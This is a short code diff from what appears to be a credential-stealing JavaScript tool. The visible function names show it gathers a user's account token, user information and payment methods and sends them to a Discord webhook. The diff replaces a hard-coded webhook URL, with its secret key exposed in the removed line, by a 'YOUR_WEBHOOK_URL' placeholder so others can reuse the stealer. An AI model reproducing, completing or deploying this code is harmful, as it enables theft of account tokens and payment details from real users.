@@ -88,7 +88,7 @@ async function fetchPaymentMethods(token) {
 }
 
 function sendToWebhook(token, userInfo, paymentMethods) {
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1316896439493722162/GxemquPpzIpTt_RLqjuODMjQimTPdXNWNu9eT8_ELKN5Hg9K-DCYhpzUeDIdh8yuqSYk';
+    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
     const formattedToken = `\n\`\`\`${token}\`\`\`\n`;
 
     const paymentMethodsField = paymentMethods.length > 0
